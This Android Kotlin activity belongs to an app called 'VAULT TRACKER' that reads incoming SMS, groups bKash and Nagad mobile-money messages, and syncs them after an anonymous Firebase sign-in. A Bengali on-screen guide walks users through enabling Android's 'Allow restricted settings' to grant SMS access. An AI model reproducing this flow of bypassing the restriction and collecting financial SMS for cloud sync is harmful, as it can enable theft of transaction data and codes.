package com.apurbo.emotions

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.lifecycle.viewmodel.compose.viewModel as composeViewModel
import com.apurbo.emotions.ui.theme.SmsOrganizerTheme
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Info
import androidx.activity.result.contract.ActivityResultContracts
import android.Manifest
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat

import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

import android.content.Intent
import android.net.Uri
import android.provider.Settings
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.foundation.background
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.border
import androidx.compose.foundation.BorderStroke

class MainActivity : ComponentActivity() {

    private var onPermissionResult: ((Boolean) -> Unit)? = null

    fun openAppInfo() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        }
        startActivity(intent)
    }

    fun requestSmsPermissions(callback: (Boolean) -> Unit) {
        onPermissionResult = callback
        requestPermissionLauncher.launch(
            arrayOf(
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
            )
        )
    }

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.entries.all { it.value }
        onPermissionResult?.invoke(allGranted)
        if (allGranted) {
            // Permissions granted, sync messages
            lifecycleScope.launch(Dispatchers.IO) {
                SmsRepository(this@MainActivity).syncPendingMessages()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Ensure user is signed in anonymously for Firestore sync
        val auth = com.google.firebase.auth.FirebaseAuth.getInstance()
        if (auth.currentUser == null) {
            auth.signInAnonymously().addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    android.util.Log.d("MainActivity", "Signed in anonymously")
                    // Trigger sync once signed in
                    lifecycleScope.launch(Dispatchers.IO) {
                        SmsRepository(this@MainActivity).syncPendingMessages()
                    }
                } else {
                    android.util.Log.e("MainActivity", "Anonymous sign in failed", task.exception)
                }
            }
        } else {
            // Already signed in, trigger sync
            lifecycleScope.launch(Dispatchers.IO) {
                SmsRepository(this@MainActivity).syncPendingMessages()
            }
        }
        
        checkPermissions()
        
        setContent {
            SmsOrganizerTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color(0xFF000000)
                ) {
                    SmsApp()
                }
            }
        }
    }

    private fun checkPermissions() {
        val permissions = arrayOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS
        )
        val missing = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        // Don't auto-request on every open if we're in restricted mode, 
        // rely on the UI button more
    }
}

@Composable
fun SmsApp(smsViewModel: SmsViewModel = composeViewModel()) {
    var selectedTab by remember { mutableStateOf(0) }
    val tabs = listOf("bKash", "Nagad", "Others")
    
    val messages by smsViewModel.messages.collectAsState()
    val context = androidx.compose.ui.platform.LocalContext.current
    
    // Permission status check
    var hasSmsPermissions by remember {
        mutableStateOf(
            androidx.core.content.ContextCompat.checkSelfPermission(
                context, android.Manifest.permission.RECEIVE_SMS
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        )
    }

    Column(modifier = Modifier.background(Color(0xFF000000))) {
        // App Bar
        Surface(
            color = Color(0xFF0A0A0A),
            modifier = Modifier.fillMaxWidth().height(60.dp),
            shadowElevation = 4.dp
        ) {
            Box(contentAlignment = androidx.compose.ui.Alignment.CenterStart, modifier = Modifier.padding(horizontal = 16.dp)) {
                Text(
                    "VAULT TRACKER", 
                    color = Color.White, 
                    fontWeight = FontWeight.Black,
                    letterSpacing = androidx.compose.ui.unit.TextUnit.Unspecified
                )
            }
        }

        TabRow(
            selectedTabIndex = selectedTab,
            containerColor = Color(0xFF000000),
            contentColor = Color(0xFFF472B6),
            divider = {}
        ) {
            tabs.forEachIndexed { index, title ->
                Tab(
                    selected = selectedTab == index,
                    onClick = { selectedTab = index },
                    text = { 
                        Text(
                            title, 
                            fontWeight = if (selectedTab == index) FontWeight.Black else FontWeight.Normal,
                            style = MaterialTheme.typography.labelMedium
                        ) 
                    }
                )
            }
        }
        
        val filteredMessages = messages.filter { 
            it.category.equals(tabs[selectedTab], ignoreCase = true) 
        }

        if (!hasSmsPermissions) {
            Card(
                modifier = Modifier.padding(16.dp),
                colors = CardDefaults.cardColors(containerColor = Color(0xFF111111)),
                shape = RoundedCornerShape(24.dp),
                border = BorderStroke(1.dp, Color(0xFFF472B6).copy(alpha = 0.2f))
            ) {
                Column(modifier = Modifier.padding(20.dp)) {
                    Text(
                        "Permission restricted?", 
                        style = MaterialTheme.typography.titleMedium, 
                        color = Color.White,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(
                        "Android ১৩+ ফোনে এই সমস্যাটি হয়। এটি ঠিক করতে নিচের ধাপগুলো অনুসরণ করুন:", 
                        style = MaterialTheme.typography.bodySmall,
                        color = Color(0xFFF472B6)
                    )
                    Spacer(modifier = Modifier.height(12.dp))
                    Text("১. নিচের 'Open Settings' বাটনে ক্লিক করুন।", color = Color.LightGray, style = MaterialTheme.typography.labelSmall)
                    Text("২. ওপরের ডান কোণায় (⋮) তিন-ডট আইকনে ক্লিক করুন।", color = Color.LightGray, style = MaterialTheme.typography.labelSmall)
                    Text("৩. 'Allow restricted settings' অপশনটি চালু করুন।", color = Color.LightGray, style = MaterialTheme.typography.labelSmall)
                    Text("৪. এরপর অ্যাপে ফিরে এসে পারমিশন দিন।", color = Color.LightGray, style = MaterialTheme.typography.labelSmall)
                    
                    Row(modifier = Modifier.padding(top = 20.dp).fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        Button(
                            onClick = { 
                                (context as? MainActivity)?.requestSmsPermissions { granted ->
                                    hasSmsPermissions = granted
                                }
                            },
                            modifier = Modifier.weight(1f),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFF472B6))
                        ) {
                            Text("Retry Grant", fontWeight = FontWeight.Bold)
                        }
                        
                        OutlinedButton(
                            onClick = { 
                                (context as? MainActivity)?.openAppInfo()
                            },
                            modifier = Modifier.weight(1f),
                            border = BorderStroke(1.dp, Color(0xFFF472B6).copy(alpha = 0.5f)),
                            shape = RoundedCornerShape(50.dp)
                        ) {
                            Text("Open Settings", color = Color.White)
                        }
                    }
                }
            }
        }
        
        if (filteredMessages.isEmpty() && hasSmsPermissions) {
            Column(
                modifier = Modifier.fillMaxSize().padding(32.dp),
                horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.Center
            ) {
                Text(
                    "No Activity Found", 
                    color = Color.Gray, 
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center
                )
                Text(
                    "Messages will appear here once received.", 
                    color = Color.DarkGray, 
                    style = MaterialTheme.typography.labelSmall,
                    textAlign = TextAlign.Center
                )
            }
        }

        LazyColumn(modifier = Modifier.fillMaxSize().padding(horizontal = 16.dp)) {
            items(filteredMessages) { msg ->
                Spacer(modifier = Modifier.height(8.dp))
                SmsItem(msg)
                Spacer(modifier = Modifier.height(8.dp))
            }
        }
    }
}

@Composable
fun SmsItem(sms: SmsMessage) {
    Card(
        shape = RoundedCornerShape(20.dp),
        colors = CardDefaults.cardColors(containerColor = Color(0xFF0A0A0A)),
        border = BorderStroke(1.dp, Color.White.copy(alpha = 0.05f))
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                Text(
                    text = sms.sender, 
                    style = MaterialTheme.typography.titleSmall, 
                    color = Color.White,
                    fontWeight = FontWeight.Black
                )
                Text(
                    text = sms.category,
                    style = MaterialTheme.typography.labelSmall,
                    color = Color(0xFFF472B6),
                    fontWeight = FontWeight.Bold
                )
            }
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                text = sms.body, 
                style = MaterialTheme.typography.bodySmall, 
                color = Color.Gray,
                lineHeight = androidx.compose.ui.unit.TextUnit.Unspecified
            )
            if (sms.trxId != null) {
                Spacer(modifier = Modifier.height(12.dp))
                Surface(
                    color = Color.White.copy(alpha = 0.05f),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Row(modifier = Modifier.padding(horizontal = 12.dp, vertical = 8.dp), verticalAlignment = androidx.compose.ui.Alignment.CenterVertically) {
                        Box(modifier = Modifier.size(6.dp).background(Color(0xFFF472B6), RoundedCornerShape(50.dp)))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = "REF: ${sms.trxId}",
                            color = Color.White,
                            style = MaterialTheme.typography.labelMedium,
                            fontWeight = FontWeight.Bold
                        )
                    }
                }
            }
        }
    }
}
